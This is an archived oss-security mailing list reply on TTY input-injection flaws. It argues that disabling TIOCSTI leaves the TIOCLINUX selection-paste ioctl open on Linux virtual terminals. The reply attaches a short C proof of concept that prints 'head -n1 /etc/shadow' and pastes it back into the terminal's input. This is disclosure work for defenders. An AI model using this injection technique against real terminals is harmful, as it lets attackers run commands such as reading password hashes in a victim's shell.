
```
[[prev in list](?l=oss-security&m=167878388806050&w=2)] [[next in list](?l=oss-security&m=167879081510352&w=2)] [[prev in thread](?l=oss-security&m=167878388806050&w=2)] [[next in thread](?l=oss-security&m=167879081510352&w=2)]
List:       [oss-security](?l=oss-security&r=1&w=2)
Subject:    [Re: [oss-security] TTY pushback vulnerabilities / TIOCSTI](?t=167878390800002&r=1&w=2)
From:       [Jakub Wilk <jwilk () jwilk ! net>](?a=129054139200002&r=1&w=2)
Date:       [2023-03-14 10:36:26](?l=oss-security&r=1&w=2&b=202303)
Message-ID: [20230314103626.3ucbt2rjdfhjbe6t () jwilk ! net](?i=20230314103626.3ucbt2rjdfhjbe6t%20()%20jwilk%20!%20net)
[Download RAW [message](?l=oss-security&m=167879021709955&q=mbox) or [body](?l=oss-security&m=167879021709955&q=raw)]

* Hanno BÃ¶ck <hanno@hboeck.de>, 2023-03-14 09:51:
>In the 2017 post solar designer mentioned that the Linux kernel
>developers have multiple times rejected changes in the kernel.

I believe this is the post in question:
<https://www.openwall.com/lists/oss-security/2017/06/03/9>

>Starting with Kernel 6.2 it is possible to disable TIOCSTI (unset
>CONFIG_LEGACY_TIOCSTI).

Nice, but...

On Linux virtual terminals, it's possible to achieve pretty much the
same effect using TIOCLINUX, the ioctl used by gpm to implement
copy&pasting.

I've attached a minimal PoC. A more elaborate one is here:
<https://github.com/jwilk/ttyjack>

--
Jakub Wilk

[["minittyjack.c" (text/x-csrc)]](?l=oss-security&m=167879021709955&q=p3)

#include <stdio.h>
#include <sys/ioctl.h>

#include <linux/tiocl.h>
#include <linux/vt.h>

int main(void)
{
    printf("\33[H\33[2J");
    printf("head -n1 /etc/shadow\n");
    fflush(stdout);
    struct {
        char padding;
        char subcode;
        struct tiocl_selection sel;
    } data = {
        .subcode = TIOCL_SETSEL,
        .sel = {
            .xs = 1, .ys = 1,
            .xe = 1, .ye = 1,
            .sel_mode = TIOCL_SELLINE
        }
    };
    ioctl(0, TIOCLINUX, &data.subcode);
    data.subcode = TIOCL_PASTESEL;
    ioctl(0, TIOCLINUX, &data.subcode);
}

[[prev in list](?l=oss-security&m=167878388806050&w=2)] [[next in list](?l=oss-security&m=167879081510352&w=2)] [[prev in thread](?l=oss-security&m=167878388806050&w=2)] [[next in thread](?l=oss-security&m=167879081510352&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)

